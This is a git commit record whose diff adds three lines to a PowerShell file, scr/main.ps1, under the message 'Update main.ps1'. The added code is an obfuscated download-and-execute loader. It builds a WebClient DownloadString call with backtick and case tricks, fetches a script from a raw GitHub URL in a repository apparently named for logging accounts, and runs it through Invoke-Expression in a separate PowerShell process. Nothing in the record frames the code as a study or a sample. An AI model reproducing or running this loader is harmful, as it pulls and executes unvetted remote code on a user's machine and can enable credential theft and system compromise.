297000f9f93f6bc577e70384c1854bfed5f3881b
43a1723 <hai1723notgay@gmail.com>
2024-07-29 11:30:49 +0700

    Update main.ps1

--- scr/main.ps1
+++ scr/main.ps1
@@ -1,1 +1,3 @@
-
+$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
